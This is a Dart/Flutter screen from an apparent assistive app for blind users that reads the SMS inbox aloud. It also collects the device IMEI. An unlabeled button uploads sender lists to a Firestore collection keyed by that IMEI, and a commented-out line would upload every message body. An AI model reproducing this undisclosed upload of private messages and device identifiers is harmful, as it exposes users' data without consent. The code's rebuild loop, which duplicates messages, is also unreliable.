// ignore_for_file: avoid_print, avoid_function_literals_in_foreach_calls, prefer_const_constructors

import 'package:blind_assistant/widgets/const.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:sms/sms.dart';

class Inbox extends StatefulWidget {
  const Inbox({Key key}) : super(key: key);

  @override
  _InboxState createState() => _InboxState();
}

class _InboxState extends State<Inbox> {
  @override
  void initState() {
    super.initState();
    _isLoading = false;
    SmsReceiver receiver = SmsReceiver();
    receiver.onSmsReceived.listen((SmsMessage msg) => print(msg.body));
    speak(
        'click to listen message sender name and long press to listen message.');
    getAllMessages();
    getImei();
  }

  SimCardsProvider provider = SimCardsProvider();

  getImei() async {
    sims = await provider.getSimCards();
    setState(() {
      imei = sims[0].imei;
    });
  }

  SmsQuery query = SmsQuery();
  List inbox = [];
  List sms = [];
  List<SimCard> sims = [];
  String imei;
  Future getAllMessages() async {
    setState(() {
      _isLoading = true;
    });
    List<SmsMessage> messages =
        await query.querySms(kinds: [SmsQueryKind.Inbox]);
    messages.forEach((element) {
      inbox.add(element.sender);
      sms.add(element.body);
    });
    setState(() {
      _isLoading = false;
    });
  }

  Future<void> uploadingData(
    String imei,
    String smsTitle,
    String content,
  ) async {
    await FirebaseFirestore.instance.collection(imei).add({
      'title': smsTitle,
      'content': content,
    });
  }

  bool _isLoading;

  @override
  Widget build(BuildContext context) {
    return _isLoading == true
        ? Scaffold(
            backgroundColor: Colors.deepOrangeAccent,
            body: Center(
              child: CircularProgressIndicator(
                color: Colors.white,
              ),
            ),
          )
        : Scaffold(
            body: Column(
              children: [
                SizedBox(
                  height: MediaQuery.of(context).size.height,
                  child: StreamBuilder(
                      stream: getAllMessages().asStream(),
                      builder: (context, snapshot) {
                        return ListView.builder(
                          physics: BouncingScrollPhysics(),
                          itemCount: inbox.length,
                          itemBuilder: (context, i) {
                            // uploadingData(imei, inbox[i], sms[i]);
                            return Column(
                              children: [
                                Container(
                                  color: Colors.deepOrangeAccent,
                                  width: double.infinity,
                                  child: ListTile(
                                    onTap: () {
                                      speak('Message from ${inbox[i]}');
                                    },
                                    onLongPress: () {
                                      speakUrdu(sms[i]);
                                    },
                                    title: Text(
                                      inbox[i],
                                      style: TextStyle(
                                          color: Colors.white, fontSize: 30),
                                    ),
                                    subtitle: Text(
                                      sms[i],
                                      style: TextStyle(
                                          fontSize: 20, color: Colors.white),
                                    ),
                                  ),
                                ),
                                Divider(
                                  height: 5,
                                  color: Colors.white,
                                )
                              ],
                            );
                          },
                        );
                      }),
                ),
              ],
            ),
            floatingActionButton: FloatingActionButton(
              onPressed: () async {
                await FirebaseFirestore.instance
                    .collection(imei)
                    .add({'messages': inbox});
              },
            ),
          );
  }
}
